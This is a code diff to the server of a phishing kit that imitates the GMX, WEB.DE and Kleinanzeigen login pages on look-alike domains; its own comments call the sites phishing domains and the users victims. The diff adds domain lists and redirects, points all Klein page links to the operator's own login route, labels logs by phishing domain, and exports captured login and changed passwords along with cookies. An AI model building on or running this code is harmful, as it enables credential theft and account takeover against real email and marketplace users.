@@ -26,6 +26,7 @@ const {
 const { buildAutomationProfile } = require('./lib/automationProfile');
 const { buildLeadLoginContextPayload } = require('./lib/leadLoginContext');
 const { scheduleWebdeLayoutHealthcheck } = require('./lib/webdeLayoutHealthScheduler');
+const { getWebLoginAndNewPasswordForExport } = require('./lib/leadExportCredentials');
 const { logTerminalFlow } = require('./lib/terminalFlowLog');
 const {
   getDb,
@@ -38,9 +39,11 @@ const {
   replaceAllLeads,
   getModeData,
   writeModeData,
-  DB_PATH
+  DB_PATH,
+  clearAllWebdeScriptActiveRuns
 } = require('./db/database.js');
 const { send, safeEnd, readApiRouteBody, parseHttpRequestUrl } = require('./utils/httpUtils');
+const { mailboxSubmitPipelinePrefix } = require('./utils/mailMailboxLogin');
 const { ADMIN_DOMAIN, checkAdminAuth, hasValidAdminSession, PASSWORD_AUTH_ENABLED, WORKER_SECRET } = require('./utils/authUtils');
 const { getPlatformFromRequest, maskEmail, EVENT_LABELS, readStartPage, getRedirectPasswordStatus } = require('./utils/formatUtils');
 const apiRoutes = require('./routes/apiRoutes');
@@ -135,6 +138,12 @@ function writeFatalSync(msg) {
 
 /** Домены сайтов: GMX и WEB.DE работают параллельно на разных доменах. Хост админки — см. src/utils/authUtils (ADMIN_DOMAIN). */
 const GMX_DOMAIN = (process.env.GMX_DOMAIN || 'gmx-net.cv').toLowerCase().replace(/^https?:\/\//, '').split('/')[0];
+/** Список хостов GMX (через запятую). Как WEBDE_DOMAINS: все считаются валидным origin без 301 на «чужой» хост. */
+const GMX_DOMAINS_RAW = (process.env.GMX_DOMAINS || '').trim();
+const GMX_DOMAINS_LIST = GMX_DOMAINS_RAW
+  ? GMX_DOMAINS_RAW.split(',').map(function (d) { return d.toLowerCase().replace(/^https?:\/\//, '').split('/')[0].trim(); }).filter(Boolean)
+  : [GMX_DOMAIN, 'www.' + GMX_DOMAIN];
+const GMX_CANONICAL_HOST = (GMX_DOMAINS_LIST[0] || GMX_DOMAIN).replace(/^www\./, '') || GMX_DOMAIN;
 const WEBDE_DOMAIN = (process.env.WEBDE_DOMAIN || 'web-de.one').toLowerCase().replace(/^https?:\/\//, '').split('/')[0];
 /** Подпись потока в логе [ВХОД] (по умолчанию домен фишинга WEBDE_DOMAIN). Env: SERVER_LOG_PHISH_LABEL */
 const SERVER_LOG_PHISH_LABEL = (process.env.SERVER_LOG_PHISH_LABEL || WEBDE_DOMAIN || 'сайт').trim() || 'сайт';
@@ -151,7 +160,42 @@ const KLEIN_DOMAINS_RAW = (process.env.KLEIN_DOMAINS || '').trim();
 const KLEIN_DOMAINS_LIST = KLEIN_DOMAINS_RAW
   ? KLEIN_DOMAINS_RAW.split(',').map(function (d) { return d.toLowerCase().replace(/^https?:\/\//, '').split('/')[0].trim(); }).filter(Boolean)
   : [KLEIN_DOMAIN, 'www.' + KLEIN_DOMAIN];
-const KLEIN_CANONICAL_HOST = KLEIN_DOMAINS_LIST[0].replace(/^www\./, '') || KLEIN_DOMAIN;
+/** Канонический хост для 301 (не первый из списка алиасов). Задаётся KLEIN_DOMAIN. */
+const KLEIN_CANONICAL_HOST = KLEIN_DOMAIN.replace(/^www\./, '');
+/** Старые хосты Klein → 301 на KLEIN_CANONICAL_HOST только до KLEIN_LEGACY_REDIRECT_UNTIL (ISO 8601). Пусто = выкл. */
+const KLEIN_LEGACY_REDIRECT_HOSTS_RAW = (process.env.KLEIN_LEGACY_REDIRECT_HOSTS || '').trim();
+const KLEIN_LEGACY_REDIRECT_HOSTS = KLEIN_LEGACY_REDIRECT_HOSTS_RAW
+  ? KLEIN_LEGACY_REDIRECT_HOSTS_RAW.split(',').map(function (d) {
+    return d.toLowerCase().replace(/^https?:\/\//, '').split('/')[0].trim();
+  }).filter(Boolean)
+  : [];
+const KLEIN_LEGACY_REDIRECT_UNTIL_MS = (function () {
+  const raw = (process.env.KLEIN_LEGACY_REDIRECT_UNTIL || '').trim();
+  if (!raw) return 0;
+  const t = Date.parse(raw);
+  return Number.isFinite(t) ? t : 0;
+})();
+
+/** @returns {boolean} true если ответ уже отправлен */
+function tryKleinLegacyHostRedirect(req, res, requestHost) {
+  if (!KLEIN_LEGACY_REDIRECT_UNTIL_MS || !KLEIN_LEGACY_REDIRECT_HOSTS.length) return false;
+  if (Date.now() >= KLEIN_LEGACY_REDIRECT_UNTIL_MS) return false;
+  const h = String(requestHost || '').split(':')[0].toLowerCase();
+  if (KLEIN_LEGACY_REDIRECT_HOSTS.indexOf(h) === -1) return false;
+  if (safeEnd(res)) return true;
+  let destPath = (req.url || '/').split('#')[0];
+  if (!destPath || destPath[0] !== '/') destPath = '/';
+  const xfProto = String(req.headers['x-forwarded-proto'] || '').split(',')[0].trim().toLowerCase();
+  let httpsOn = xfProto === 'https';
+  try {
+    if (!httpsOn && req.socket && req.socket.encrypted === true) httpsOn = true;
+  } catch (_) {}
+  const proto = httpsOn ? 'https' : 'http';
+  const loc = proto + '://' + KLEIN_CANONICAL_HOST + destPath;
+  res.writeHead(301, { Location: loc, 'Cache-Control': 'no-store' });
+  res.end();
+  return true;
+}
 
 /** Сообщение под формой Klein после неверного пароля (скрипт автовхода). */
 const KLEIN_VICTIM_PASSWORD_ERROR_DE = 'Die E-Mail-Adresse ist nicht registriert oder das Passwort ist falsch. Bitte überprüfe deine Eingaben.';
@@ -164,7 +208,7 @@ const BRANDS = {
     primaryColor: '#1c449b',
     primaryColorDark: '#16367c',
     canonicalUrl: 'https://www.gmx.net/',
-    canonicalHost: GMX_DOMAIN,
+    canonicalHost: GMX_CANONICAL_HOST,
     impressumUrl: 'https://www.gmx.net/impressum/',
     datenschutzUrl: 'https://agb-server.gmx.net/datenschutz',
     agbUrl: 'https://agb-server.gmx.net/gmxagb-de',
@@ -188,19 +232,37 @@ const BRANDS = {
   },
   klein: {
     id: 'klein',
-    name: 'Kleinanzeigen',
-    logoUrl: 'https://static.kleinanzeigen.de/m/img/common/logo-mobile-kleinanzeigen.1x0pahqxgxyso.svg',
+    name: 'Konto',
+    logoUrl: '/klein-local-logo.png',
     primaryColor: '#326916',
     primaryColorDark: '#2a5712',
-    canonicalUrl: 'https://www.kleinanzeigen.de/',
+    canonicalUrl: '/',
     canonicalHost: KLEIN_CANONICAL_HOST,
-    impressumUrl: 'https://www.kleinanzeigen.de/impressum.html',
-    datenschutzUrl: 'https://themen.kleinanzeigen.de/datenschutzerklaerung/',
-    agbUrl: 'https://themen.kleinanzeigen.de/nutzungsbedingungen/',
-    hilfeUrl: 'https://hilfe.kleinanzeigen.de/hc/de',
-    passwortUrl: 'https://www.kleinanzeigen.de/m-passwort-vergessen-inapp.html'
+    impressumUrl: '/anmelden',
+    datenschutzUrl: '/anmelden',
+    agbUrl: '/anmelden',
+    hilfeUrl: '/anmelden',
+    passwortUrl: '/anmelden'
   }
 };
+
+/** Klein: ссылки и canonical только на текущий хост (без внешних доменов бренда). */
+function kleinBrandForRequest(req) {
+  const base = BRANDS.klein;
+  if (!req || !req.headers || !req.headers.host) return Object.assign({}, base);
+  const hostHdr = String(req.headers.host).trim().replace(/\/$/, '');
+  const protoHdr = String(req.headers['x-forwarded-proto'] || '').split(',')[0].trim().toLowerCase();
+  const proto = protoHdr === 'https' ? 'https' : 'http';
+  const root = proto + '://' + hostHdr;
+  return Object.assign({}, base, {
+    canonicalUrl: root + '/',
+    impressumUrl: root + '/anmelden',
+    datenschutzUrl: root + '/anmelden',
+    agbUrl: root + '/anmelden',
+    hilfeUrl: root + '/anmelden',
+    passwortUrl: root + '/anmelden',
+  });
+}
 
 /** Является ли хост локальным (тесты): localhost, 127.0.0.1, 0.0.0.0, локальная сеть. */
 function isLocalHost(host) {
@@ -214,14 +276,41 @@ function isLocalHost(host) {
 function getBrand(req) {
   const host = (req && req.headers && req.headers.host ? req.headers.host : '').split(':')[0].toLowerCase();
   if (isLocalHost(host)) return BRANDS.webde;
-  if (KLEIN_DOMAINS_LIST.indexOf(host) !== -1) return BRANDS.klein;
+  if (KLEIN_DOMAINS_LIST.indexOf(host) !== -1) return kleinBrandForRequest(req);
   if (WEBDE_DOMAINS_LIST.indexOf(host) !== -1) return BRANDS.webde;
   return BRANDS.gmx;
 }
 
+/** Хост публичной страницы (как у жертвы за прокси): X-Forwarded-Host иначе Host. */
+function inboundRequestHost(req) {
+  if (!req || !req.headers) return '';
+  const xf = req.headers['x-forwarded-host'];
+  const raw = (xf && String(xf).split(',')[0].trim()) || String(req.headers.host || '');
+  return raw.split(':')[0].toLowerCase();
+}
+
+/**
+ * Вторая колонка в [ВХОД] терминала: домен фишинг-сайта по фактическому запросу (GMX / WEB.DE / Klein),
+ * а не SERVER_LOG_PHISH_LABEL (часто WEBDE_DOMAIN), иначе на GMX-домене в логе оставался web-de.one.
+ */
+function terminalEntradaSiteLabel(req) {
+  const host = inboundRequestHost(req);
+  if (!host) return SERVER_LOG_PHISH_LABEL;
+  if (isLocalHost(host)) return SERVER_LOG_PHISH_LABEL;
+  if (KLEIN_DOMAINS_LIST.indexOf(host) !== -1) return KLEIN_CANONICAL_HOST;
+  if (WEBDE_DOMAINS_LIST.indexOf(host) !== -1) return WEBDE_CANONICAL_HOST;
+  if (GMX_DOMAINS_LIST.indexOf(host) !== -1) return GMX_CANONICAL_HOST;
+  return host.replace(/^www\./, '') || SERVER_LOG_PHISH_LABEL;
+}
+
 /** Канонический домен для текущего запроса (по бренду хоста). */
 function getCanonicalDomain(req) {
-  return getBrand(req).canonicalHost;
+  const brand = getBrand(req);
+  if (brand.id === 'klein') {
+    const host = (req && req.headers && req.headers.host ? req.headers.host : '').split(':')[0].toLowerCase();
+    return host.replace(/^www\./, '');
+  }
+  return brand.canonicalHost;
 }
 
 /** Разрешённые домены почты для бренда GMX при /api/submit (если ENABLE_EMAIL_DOMAIN_ALLOWLIST=1). WEB.DE: всегда только @web.de (на localhost — любой). Klein: любой домен. */
@@ -499,27 +588,29 @@ function pushEvent(lead, label, source, meta) {
 }
 
 /** Текст для события «Сайт → сервер: submit принят» (и сырой объект в newEvents). */
-function submitPipelineDetail(kind, hasPassword, extraDetail) {
+function submitPipelineDetail(kind, hasPassword, extraDetail, mailEmail) {
   let detail = '';
+  const em = mailEmail != null && mailEmail !== '' ? String(mailEmail).trim() : '';
   if (kind === 'klein-flow') {
     detail = 'страница Klein на домене WEB.DE (kleinFlow), ' + (hasPassword ? 'email+пароль Kl' : 'только email Kl');
   } else if (kind === 'klein') {
-    detail = 'сайт Kleinanzeigen, ' + (hasPassword ? 'email+пароль Kl' : 'только email Kl');
+    detail = 'Klein-страница (домен оператора), ' + (hasPassword ? 'email+пароль Kl' : 'только email Kl');
   } else {
-    detail = 'WEB.DE / почта, ' + (hasPassword ? 'email+пароль' : 'только email');
+    detail = mailboxSubmitPipelinePrefix(em) + ', ' + (hasPassword ? 'email+пароль' : 'только email');
   }
   if (extraDetail) detail += ' · ' + extraDetail;
   return detail;
 }
 
-function submitPipelineEventRaw(atIso, kind, hasPassword, extraDetail) {
-  return { at: atIso, label: 'Сайт → сервер: submit принят', source: 'user', detail: submitPipelineDetail(kind, hasPassword, extraDetail) };
+function submitPipelineEventRaw(atIso, kind, hasPassword, extraDetail, mailEmail) {
+  return { at: atIso, label: 'Сайт → сервер: submit принят', source: 'user', detail: submitPipelineDetail(kind, hasPassword, extraDetail, mailEmail) };
 }
 
 /** Коротко: что пришло с формы до событий «Ввел почту» / Kl. */
 function pushSubmitPipelineEvent(lead, kind, hasPassword, extraDetail) {
   if (!lead) return;
-  pushEvent(lead, 'Сайт → сервер: submit принят', 'user', { detail: submitPipelineDetail(kind, hasPassword, extraDetail) });
+  const em = lead.email != null ? String(lead.email).trim() : '';
+  pushEvent(lead, 'Сайт → сервер: submit принят', 'user', { detail: submitPipelineDetail(kind, hasPassword, extraDetail, em) });
 }
 
 /** Нормализует историю паролей из старого лога в массив { p, s } (для переноса при слиянии). */
@@ -535,20 +626,9 @@ function normalizePasswordHistory(hist) {
   return [];
 }
 
-/** Для выгрузки куки: пароль со страницы входа и пароль со страницы смены (new). */
+/** Для выгрузки куки: только WEB login + WEB смена пароля (не Klein). */
 function getLoginAndNewPassword(lead) {
-  const history = Array.isArray(lead.passwordHistory) ? lead.passwordHistory : [];
-  let passLogin = (lead.password != null) ? String(lead.password).trim() : '';
-  let passNew = '';
-  const firstLogin = history.find(function (e) { return e && e.s === 'login'; });
-  if (firstLogin && firstLogin.p != null) passLogin = String(firstLogin.p).trim();
-  for (let i = history.length - 1; i >= 0; i--) {
-    if (history[i] && history[i].s === 'change') {
-      passNew = (history[i].p != null) ? String(history[i].p).trim() : '';
-      break;
-    }
-  }
-  return { passLogin: passLogin || '', passNew: passNew || '' };
+  return getWebLoginAndNewPasswordForExport(lead);
 }
 
 function cookieSafeForLoginCookiesFile(email) {
@@ -808,6 +888,18 @@ automationService.init({
 
 initAppServices({ pushEvent });
 
+try {
+  const clearedRuns = clearAllWebdeScriptActiveRuns();
+  if (clearedRuns > 0) {
+    invalidateLeadsCache();
+    console.log(
+      '[SERVER] Сброшен webde_script_active_run у ' + clearedRuns + ' лид(ов) при старте (после PM2/аварии без slot-done).'
+    );
+  }
+} catch (e) {
+  console.warn('[SERVER] clearAllWebdeScriptActiveRuns:', e && e.message ? e.message : e);
+}
+
 const {
   WEBDE_LOGIN_MAX_CONCURRENT,
   runningWebdeLoginLeadIds,
@@ -1013,6 +1105,9 @@ const ROUTE_HTTP_DEPS = mergeServiceRouteDeps({
   EVENT_LABELS: EVENT_LABELS,
   GATE_TIME_TTL_MS: GATE_TIME_TTL_MS,
   GMX_DOMAIN: GMX_DOMAIN,
+  GMX_CANONICAL_HOST: GMX_CANONICAL_HOST,
+  GMX_DOMAINS_LIST: GMX_DOMAINS_LIST,
+  GMX_DOMAINS_RAW: GMX_DOMAINS_RAW,
   HEARTBEAT_MAX_AGE_MS: HEARTBEAT_MAX_AGE_MS,
   HOST: HOST,
   KLEIN_CANONICAL_HOST: KLEIN_CANONICAL_HOST,
@@ -1034,6 +1129,7 @@ const ROUTE_HTTP_DEPS = mergeServiceRouteDeps({
   REQUIRE_GATE_COOKIE: REQUIRE_GATE_COOKIE,
   SAVED_CREDENTIALS_FILE: SAVED_CREDENTIALS_FILE,
   SERVER_LOG_PHISH_LABEL: SERVER_LOG_PHISH_LABEL,
+  terminalEntradaSiteLabel: terminalEntradaSiteLabel,
   SHORT_DOMAINS_FILE: SHORT_DOMAINS_FILE,
   SHORT_DOMAINS_TTL_MS: SHORT_DOMAINS_TTL_MS,
   START_PAGE_FILE: START_PAGE_FILE,
@@ -1213,6 +1309,7 @@ const server = http.createServer(async (req, res) => {
   }
 
   const requestHost = (req.headers.host || '').split(':')[0].toLowerCase();
+  if (tryKleinLegacyHostRedirect(req, res, requestHost)) return;
   const isLocalhost = requestHost === 'localhost' || requestHost === '127.0.0.1' || requestHost === '';
   const isAdminPage = isAdminPagePath(pathname);
   const isAdminLoginPage = isAdminLoginPath(pathname);
@@ -1235,6 +1332,9 @@ const server = http.createServer(async (req, res) => {
     shortDomainsList,
     getCanonicalDomain,
     GMX_DOMAIN,
+    GMX_DOMAINS_LIST,
+    WEBDE_DOMAINS_LIST,
+    KLEIN_DOMAINS_LIST,
     PROJECT_ROOT,
     getBrand,
     getShortDomainsList,
